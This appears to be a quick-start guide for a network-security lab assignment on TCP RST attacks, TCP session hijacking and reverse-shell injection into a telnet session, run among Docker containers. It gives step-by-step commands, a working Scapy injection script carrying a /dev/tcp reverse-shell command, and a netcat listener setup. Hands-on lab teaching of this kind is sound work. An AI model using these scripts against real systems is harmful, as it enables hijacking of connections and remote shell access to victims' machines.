# QUICK START - Tasks 2, 3 & 4

## 🚀 Get Started in 5 Minutes

### Prerequisites Check
```bash
# Verify containers running
docker ps | grep -E "attacker|victim|user"

# Verify netcat installed
which nc

# Verify bridge interface exists
ip link show | grep br-983f4e838608
```

---

## Task 2: TCP RST Attack

### Quick Manual Version
```bash
# Terminal 1: Start Wireshark
wireshark &
# Select: br-983f4e838608, Filter: tcp port 23

# Terminal 2: Attacker shell
docksh <attacker_id>
telnet 10.9.0.5
# Login: seed / dees
# Type: echo test

# Terminal 3: Edit and run
nano /volumes/rst_attack.py
# Update: SRC_IP, DST_IP, SPORT, SEQ from Wireshark
sudo python3 /volumes/rst_attack.py
```

**Expected:** Telnet session dies

### Quick Automatic Version
```bash
# Terminal 1: Attacker
docksh <attacker>
sudo python3 /volumes/rst_attack_auto.py &

# Terminal 2: Connect telnet
docksh <user1>
telnet 10.9.0.5
seed / dees
# Type anything...
```

**Expected:** Connection killed instantly

---

## Task 3: TCP Session Hijacking

### Quick Manual Version
```bash
# Same as Task 2 setup:
# Terminal 1: Wireshark on br-983f4e838608
# Terminal 2: Establish telnet
# Terminal 3: Edit and run

nano /volumes/session_hijack.py
# Update: SRC_IP, DST_IP, SPORT, SEQ, ACK from Wireshark
# Update: DATA = command to inject
sudo python3 /volumes/session_hijack.py

# Verify on victim:
docksh <victim>
ls -la /tmp/hijacked  # File should exist!
```

**Expected:** Command executes on victim

---

## Task 4: Reverse Shell

### Quick Setup
```bash
# Terminal 1: VM - Start netcat listener
nc -lnv 9090
# Output: Listening on 0.0.0.0 9090

# Terminal 2: Attacker shell
docksh <attacker>
telnet 10.9.0.5
seed / dees

# Terminal 3: Wireshark (VM)
wireshark &
# Capture on: br-983f4e838608
# Filter: tcp port 23

# Terminal 4: Run injection
nano /volumes/hijack_reverse.py
# Copy code below...
sudo python3 /volumes/hijack_reverse.py
```

### Reverse Shell Injection Code
```python
#!/usr/bin/env python3
from scapy.all import *

# From Wireshark:
SRC_IP  = "10.9.0.6"   # client
DST_IP  = "10.9.0.5"   # server
SPORT   = 12345        # FROM WIRESHARK
DPORT   = 23
SEQ     = 0            # FROM WIRESHARK
ACK     = 0            # FROM WIRESHARK

CMD = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"

ip = IP(src=SRC_IP, dst=DST_IP)
tcp = TCP(sport=SPORT, dport=DPORT, flags="A", seq=SEQ, ack=ACK)
pkt = ip / tcp / CMD

send(pkt, verbose=0)
print("[+] Reverse shell injected!")
```

**Expected:** netcat window shows:
```
Connection received on 10.9.0.5 xxxxx
$ whoami
```

---

## Critical Values from Wireshark

| In Wireshark | Variable | Example |
|--------------|----------|---------|
| IPv4 Src | SRC_IP | 10.9.0.6 |
| IPv4 Dst | DST_IP | 10.9.0.5 |
| TCP Src | SPORT | 48392 |
| TCP Dst | DPORT | 23 |
| Sequence# | SEQ | 1234567 |
| Acknowledgement# | ACK | 7654321 |

---

## Aliases (if available)
```bash
dockps  # docker ps --format "{{.ID}} {{.Names}}"
docksh  # docker exec -it
dcup    # docker-compose up
dcdown  # docker-compose down
```

If not, use full commands:
```bash
docker ps --format "{{.ID}} {{.Names}}"
docker exec -it <id> /bin/bash
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Command not found | Use `sudo python3` not just `python3` |
| Port in use | `pkill nc` then retry |
| Telnet won't connect | Use IPs not hostnames: `telnet 10.9.0.5` |
| Packets not injected | Check SEQ/ACK are exact from Wireshark |
| No reverse shell connection | Verify netcat is listening, use correct IP:port |
| Interface not found | Check: `ip link show \| grep br-` |

---

## Document Your Work

For each task, capture:
1. ✅ Wireshark showing telnet traffic
2. ✅ Attack script running
3. ✅ Result (termination/injection/shell)
4. ✅ Proof of execution (on victim)

---

## Success = Screenshots + Explanations

Don't just attach code! Include:
- What each script does
- How TCP parameters were obtained
- Why the attack works
- What security implications exist

---

Ready? Start with **Task 2 manual** first! 🎯
